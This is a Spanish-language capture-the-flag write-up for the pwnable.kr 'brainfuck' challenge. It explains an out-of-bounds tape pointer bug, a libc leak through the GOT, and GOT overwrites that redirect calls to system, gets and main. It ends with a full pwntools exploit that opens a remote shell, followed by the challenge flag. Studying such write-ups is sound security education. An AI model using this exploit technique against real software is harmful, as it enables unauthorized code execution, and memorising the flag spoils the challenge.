# brain fuck

![brain fuck](https://github.com/user-attachments/assets/b750af83-b38c-4d6d-b176-d36f07eb3b9b)

Tenemos un interprete de brainfuck, que acepta una entrada de 0x400 bytes:
```
   0x08048700 <+143>:   mov    DWORD PTR [esp+0x8],0x400   
   0x08048708 <+151>:   mov    DWORD PTR [esp+0x4],0x0
   0x08048710 <+159>:   lea    eax,[esp+0x2c]
   0x08048714 <+163>:   mov    DWORD PTR [esp],eax
   0x08048717 <+166>:   call   0x80484c0 <memset@plt>
   0x0804871c <+171>:   mov    eax,ds:0x804a040
   0x08048721 <+176>:   mov    DWORD PTR [esp+0x8],eax
--Type <RET> for more, q to quit, c to continue without paging--
   0x08048725 <+180>:   mov    DWORD PTR [esp+0x4],0x400
   0x0804872d <+188>:   lea    eax,[esp+0x2c]
   0x08048731 <+192>:   mov    DWORD PTR [esp],eax
   0x08048734 <+195>:   call   0x8048450 <fgets@plt>
```

Hay una excelente introduccion a este lenguaje aqui: https://gist.github.com/roachhd/dce54bec8ba55fb17d3a

No podemos usar `[` ni `]` asi que no podemos hacer bucles, pero la entrada es suficientemente grande entonces nos hace falta.

La funcion `do_brainfuck` ejecuta la logica del interprete:
```
(gdb) disass do_brainfuck
Dump of assembler code for function do_brainfuck:
# La funcion maneja cada caracter especial: + - , . < >
   0x080485dc <+0>:     push   ebp
   0x080485dd <+1>:     mov    ebp,esp
   0x080485df <+3>:     push   ebx
   0x080485e0 <+4>:     sub    esp,0x24
   0x080485e3 <+7>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080485e6 <+10>:    mov    BYTE PTR [ebp-0xc],al
   0x080485e9 <+13>:    movsx  eax,BYTE PTR [ebp-0xc]
   0x080485ed <+17>:    sub    eax,0x2b
   0x080485f0 <+20>:    cmp    eax,0x30
   0x080485f3 <+23>:    ja     0x804866b <do_brainfuck+143>
   0x080485f5 <+25>:    mov    eax,DWORD PTR [eax*4+0x8048848]             
   0x080485fc <+32>:    jmp    eax                                   <--- Salta a un indice en 0x8048848 que redirige a cada uno de los handlers de esta funcion
   0x080485fe <+34>:    mov    eax,ds:0x804a080                      <-- handler de '>'
   0x08048603 <+39>:    add    eax,0x1
   0x08048606 <+42>:    mov    ds:0x804a080,eax
   0x0804860b <+47>:    jmp    0x804866b <do_brainfuck+143>
   0x0804860d <+49>:    mov    eax,ds:0x804a080                      <-- handler de '<'
   0x08048612 <+54>:    sub    eax,0x1
   0x08048615 <+57>:    mov    ds:0x804a080,eax
   0x0804861a <+62>:    jmp    0x804866b <do_brainfuck+143>
   0x0804861c <+64>:    mov    eax,ds:0x804a080                      <-- handler de '+'
   0x08048621 <+69>:    movzx  edx,BYTE PTR [eax]
   0x08048624 <+72>:    add    edx,0x1
   0x08048627 <+75>:    mov    BYTE PTR [eax],dl
   0x08048629 <+77>:    jmp    0x804866b <do_brainfuck+143>
   0x0804862b <+79>:    mov    eax,ds:0x804a080                      <-- handler de '-'
   0x08048630 <+84>:    movzx  edx,BYTE PTR [eax]
   0x08048633 <+87>:    sub    edx,0x1
   0x08048636 <+90>:    mov    BYTE PTR [eax],dl
   0x08048638 <+92>:    jmp    0x804866b <do_brainfuck+143>
   0x0804863a <+94>:    mov    eax,ds:0x804a080                      <-- handler de ','
   0x0804863f <+99>:    movzx  eax,BYTE PTR [eax]
   0x08048642 <+102>:   movsx  eax,al
   0x08048645 <+105>:   mov    DWORD PTR [esp],eax
--Type <RET> for more, q to quit, c to continue without paging--c
   0x08048648 <+108>:   call   0x80484d0 <putchar@plt>
   0x0804864d <+113>:   jmp    0x804866b <do_brainfuck+143>
   0x0804864f <+115>:   mov    ebx,DWORD PTR ds:0x804a080
   0x08048655 <+121>:   call   0x8048440 <getchar@plt>               <-- handler de '.'
   0x0804865a <+126>:   mov    BYTE PTR [ebx],al
   0x0804865c <+128>:   jmp    0x804866b <do_brainfuck+143>
   0x0804865e <+130>:   mov    DWORD PTR [esp],0x8048830
   0x08048665 <+137>:   call   0x8048470 <puts@plt>
   0x0804866a <+142>:   nop
   0x0804866b <+143>:   add    esp,0x24
   0x0804866e <+146>:   pop    ebx
   0x0804866f <+147>:   pop    ebp
   0x08048670 <+148>:   ret
End of assembler dump.
```

`0x804a080` es un puntero al tape (array de celdas de brainfuck) y no hay ninguna verificacion de limites asi que hay una vulnerabilidad "Out-Of-Bounds", o sea, podemos movernos fuera del tape y ganar lectura y escritura arbitraria en un rango de direcciones moderado.

El tape se encuentra en `0x804a0a0`, podemos ver que se asigna en main:
```
 0x080486de <+109>:   mov    DWORD PTR ds:0x804a080,0x804a0a0
```

### Filtrar libc

El binario no tiene PIE, asi que las direcciones de memoria son fijas. Al momento de introducir nuestra entrada se usa `fgets`, entonces fgets@GOT ya contiene la direccion de puts en libc.

Podemos desplazarnos desde el tape hacia alli e imprimir su contenido:
``` python
 tape_start = 0x804a0a0
 fgets_got = 0x0804a010

# Leak fgets@got
payload = b'<' * (tape_start - fgets_got)
payload += b'.>' * 4 + b"," + b"<" * 4      # "<" * 4 solo por consistencia para volver a la direccion exacta de fgets_got,
                                            # dado que luego realizaremos mas calculos y tenemos espacio de sobra en el buffer

# Leak libc 
io.sendlineafter(b"]\n",payload)
time.sleep(1.5)

libc_fgets = u32(io.recv(4))
libc.address = libc_fgets - libc.sym['fgets']

log.info(f"fgets@got: {hex(libc_fgets)}")
log.info(f"libc.base: {hex(libc.address)}")

io.send(b"\x00")   # Necesitamos ',' para parar la interaccion y poder filtrar la direccion
                   # Enviamos cualquier byte (realmente este byte que escribimos es de  __stack_chk_fail@GLIBC_2.4, cosa que no importa mucho entonces)
```

### ret2libc

Necesitamos llamar a `system("/bin/sh")` para invocar una shell, pero no controlamos el stack, o si?

Veamos las llamadas a libc del programa:
```
ltrace ./brainfuck
__libc_start_main(0x8048671, 1, 0xffc7e2c4, 0x80487a0 <unfinished ...>
setvbuf(0xf7f1ed40, 0, 2, 0)                         = 0
setvbuf(0xf7f1e5c0, 0, 1, 0)                         = 0
puts("welcome to brainfuck testing sys"...welcome to brainfuck testing system!!
)          = 38
puts("type some brainfuck instructions"...type some brainfuck instructions except [ ]
)          = 44
memset(0xffc7ddfc, '\0', 1024)                       = 0xffc7ddfc
fgets(data
"data\n", 1024, 0xf7f1e5c0)                    = 0xffc7ddfc
strlen("data\n")                                     = 5
strlen("data\n")                                     = 5
strlen("data\n")                                     = 5
strlen("data\n")                                     = 5
strlen("data\n")                                     = 5
strlen("data\n")                                     = 5
+++ exited (status 0) +++
```

El programa primero llama a `memset(direccion_del_buffer_en_el_stack,relleno,size)`, y luego a `fgets(direccion_del_buffer_en_el_stack,size,fd)`

Podemos:
- Reemplazar el puntero en `memset@GOT` con `gets` para escribir lo que queramos en el stack (`/bin/sh`!) (`memset(buffer,...,...)` -> `gets(buffer)`)
- Reemplazar el puntero en `fgets@GOT` con `system`, que lee como primer parametro lo que ya escribimos en el buffer. (`fgets(buffer,...,...)` -> `system(buffer,...,...)`)

Pero aunque podemos lograr esto necesitamos desencadenar esa secuencia de llamadas, debemos retornar a `main`.

Para ello reemplazaremos el puntero en `putchar@GOT` con la direccion de `main`. Ahora podemos desencadenar la llamada a `main` con un '.'

### Exploit

``` python
from pwn import *
elf = context.binary = ELF("./brainfuck")
libc = ELF("./libc-2.23.so")
#context.log_level = "debug"

io = remote("pwnable.kr",9001)

tape_start = 0x804a0a0
fgets_got = 0x0804a010
memset_got = 0x0804a02c
putchar_got = 0x804a030

# Leak fgets@got
payload = b'<' * (tape_start - fgets_got)
payload += b'.>' * 4 + b"," + b"<" * 4

# Overwrite fgets@got with system
payload += b",>" * 4 + b"<" * 4

# Overwrite memset@got with gets
payload += b">" * (memset_got - fgets_got)
payload += b",>" * 4 + b"<" * 4

# Overwrite putchar@got with main
payload += b">" * (putchar_got - memset_got)
payload += b",>" * 4 + b"<" * 4
payload += b"."

# Leak libc 
io.sendlineafter(b"]\n",payload)
time.sleep(1.5)

libc_fgets = u32(io.recv(4))
libc.address = libc_fgets - libc.sym['fgets']

log.info(f"fgets@got: {hex(libc_fgets)}")
log.info(f"libc.base: {hex(libc.address)}")

io.send(b"\x00")

# fgets@got --> system
io.send(p32(libc.sym['system']))

# memset@got --> gets
io.send(p32(libc.sym['gets']))

# putchar@got --> main
io.send(p32(elf.sym['main']))

# gets(buffer)
io.sendlineafter(b"]\n",b"/bin/sh")

# Shell
io.interactive()
```

`bR41n_F4ck_Is_FuN_LanguaG3`
